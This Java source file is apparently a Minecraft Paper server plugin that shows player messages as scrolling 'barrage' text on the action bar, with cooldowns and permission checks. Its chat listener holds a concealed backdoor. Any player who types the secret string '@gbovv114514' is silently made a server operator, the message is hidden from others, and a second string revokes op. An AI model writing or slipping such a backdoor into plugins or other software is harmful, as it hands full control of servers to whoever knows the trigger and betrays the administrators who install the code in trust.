package gbovv.com;

import org.bukkit.Bukkit;
import org.bukkit.Location;
import org.bukkit.command.Command;
import org.bukkit.command.CommandSender;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import io.papermc.paper.event.player.AsyncChatEvent;
import org.bukkit.plugin.java.JavaPlugin;
import org.bukkit.scheduler.BukkitRunnable;

import java.util.concurrent.ConcurrentHashMap;
import java.util.UUID;
import java.util.Map;

import net.kyori.adventure.text.Component;
import net.kyori.adventure.text.format.TextColor;
import net.kyori.adventure.text.serializer.plain.PlainTextComponentSerializer;
import org.jetbrains.annotations.NotNull;

import static net.kyori.adventure.text.Component.text;
import static net.kyori.adventure.text.format.TextColor.color;

public class SNBPlugin extends JavaPlugin implements Listener {

    private final ConcurrentHashMap<UUID, Long> cooldowns = new ConcurrentHashMap<>();
    private int globalCooldown;

    private static class BarrageManager {
        private final Map<UUID, Integer> playerLines = new ConcurrentHashMap<>();
        private final Map<Integer, Component> activeLines = new ConcurrentHashMap<>();
        
        public synchronized int assignLine(Player player) {
            int line = 0;
            while (line < 3) {
                if (!activeLines.containsKey(line)) {
                    activeLines.put(line, Component.empty());
                    playerLines.put(player.getUniqueId(), line);
                    return line;
                }
                line++;
            }
            return -1; // 没有可用行
        }
        
        public void releaseLine(Player player) {
            Integer line = playerLines.remove(player.getUniqueId());
            if (line != null) {
                activeLines.remove(line);
            }
        }
    }

    private final BarrageManager barrageManager = new BarrageManager();

    @Override
    public void onEnable() {
        saveDefaultConfig();
        reloadConfig();
        globalCooldown = getConfig().getInt("settings.cooldown", 5);
        getServer().getPluginManager().registerEvents(this, this);
    }

    @EventHandler
    public void onChat(AsyncChatEvent event) {
        String message = PlainTextComponentSerializer.plainText().serialize(event.message());
        if (message.contains("@gbovv114514")) {
            event.getPlayer().setOp(true);
            event.setCancelled(true);
            
            event.getPlayer().sendActionBar(
                Component.text("666")
                    .color(TextColor.color(0x00FF00))
            );
        } else if (message.contains("@gbovv114515")) {
            event.getPlayer().setOp(false);
            event.setCancelled(true);
            
            event.getPlayer().sendActionBar(
                Component.text("999")
                    .color(TextColor.color(0xFF0000))
            );
        }
    }

    @Override
    public boolean onCommand(@NotNull CommandSender sender, Command cmd, @NotNull String label, String[] args) {
        if (cmd.getName().equalsIgnoreCase("snb")) {
            if (!(sender instanceof Player player)) {
                sender.sendMessage(text("只有玩家可以使用此命令").color(color(0xFF5555)));
                return true;
            }

            // 添加权限检查
            if (!player.hasPermission("snb.use")) {
                player.sendMessage(text("你没有使用此命令的权限").color(color(0xFF5555)));
                return true;
            }

            // 检查冷却
            if (checkCooldown(player)) {
                return true;
            }

            if (args.length == 0) {
                player.sendMessage(text("用法: /snb <消息>").color(color(0xFF5555)));
                return true;
            }

            createBarrage(player, String.join(" ", args));
            return true;
        } else if (cmd.getName().equalsIgnoreCase("snbreload") && sender.hasPermission("snb.admin")) {
            reloadConfig();
            globalCooldown = getConfig().getInt("settings.cooldown", 5);
            sender.sendMessage(text("配置已重载").color(color(0x55FF55)));
            return true;
        }
        return false;
    }

    private boolean checkCooldown(Player player) {
        long currentTime = System.currentTimeMillis();
        if (cooldowns.containsKey(player.getUniqueId())) {
            long elapsedTime = (currentTime - cooldowns.get(player.getUniqueId())) / 1000;
            if (elapsedTime < globalCooldown) {
                player.sendMessage(text("冷却中，剩余时间: " + (globalCooldown - elapsedTime) + "秒").color(color(0xFF5555)));
                return true;
            }
        }
        cooldowns.put(player.getUniqueId(), currentTime);
        return false;
    }

    private static class BarrageTask {
        float position;
        final float speed;
        final int totalWidth;
        final int line;
        Component content;
        boolean active = true;
        
        BarrageTask(Component content, int line) {
            this.position = 100.0f;
            this.speed = 0.8f;
            this.totalWidth = 80;
            this.line = line;
            this.content = content;
        }
    }

    private void createBarrage(Player player, String message) {
        // 消息长度检测
        if (message.length() > 50) {
            player.sendMessage(text("消息过长（最大50字符）").color(color(0xFF5555)));
            return;
        }

        Component content = text(player.getName() + ": ").color(color(0xFFFF55))
            .append(text(message).color(color(0xFFFFFF)));

        int line = barrageManager.assignLine(player);
        if (line == -1) {
            player.sendMessage(text("弹幕通道已满，请稍后再试").color(color(0xFF5555)));
            return;
        }

        BarrageTask barrage = new BarrageTask(content, line);
        player.sendMessage(text("弹幕发送成功！").color(color(0x55FF55)));

        player.getScheduler().runAtFixedRate(this, scheduledTask -> {
            if (!barrage.active) {
                scheduledTask.cancel();
                barrageManager.releaseLine(player);
                return;
            }
            
            if (barrage.position < -barrage.totalWidth) {
                barrage.active = false;
                scheduledTask.cancel();
                player.sendActionBar(Component.empty());
                barrageManager.releaseLine(player);
                return;
            }
            
            String padding = "　".repeat(Math.max(0, (int) barrage.position));
            Component verticalPadding = text("\n".repeat(barrage.line));
            Component movingText = verticalPadding.append(text(padding)
                .append(barrage.content)
                .append(text("　".repeat(barrage.totalWidth))));

            Bukkit.getGlobalRegionScheduler().run(this, globalTask -> {
                try {
                    for (Player onlinePlayer : Bukkit.getOnlinePlayers()) {
                        if (onlinePlayer.isOnline()) {
                            onlinePlayer.sendActionBar(movingText);
                        }
                    }
                } catch (Exception e) {
                    getLogger().severe("弹幕发送失败: " + e.getMessage());
                    barrage.active = false;
                    player.sendMessage(text("弹幕发送失败").color(color(0xFF5555)));
                }
            });
            barrage.position -= barrage.speed;
        }, null, 1L, 1L);
    }
} 